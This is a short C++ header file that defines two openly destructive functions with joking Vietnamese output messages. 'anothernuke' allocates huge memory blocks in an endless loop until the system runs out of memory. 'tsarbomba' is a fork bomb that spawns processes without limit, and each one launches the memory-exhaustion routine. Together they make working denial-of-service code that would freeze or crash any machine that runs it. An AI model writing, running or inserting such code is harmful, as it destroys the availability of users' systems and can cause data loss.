#pragma once
#include <iostream>
#include <vector>
#include <cstdlib>
#include <limits.h>
#include <unistd.h>
#include <thread>
namespace cppheader {
    int anothernuke() {
        std::vector<void*> phan_cap_phat;
        while (true) {
            void* ptr = malloc(INT_MAX);
            if (!ptr) {
                std::cout << "Cuu! May tinh sap no!" << std::endl;
                break;
            }
            phan_cap_phat.push_back(ptr);
            std::cout << "Da cap phat them co... khong biet!" << std::endl;
        }
        return 0;
    }
    int tsarbomba() {
        while (true) {
            if (fork() == 0) {
                std::thread(anothernuke).detach();
            }
        }
        return 0;
    }
}
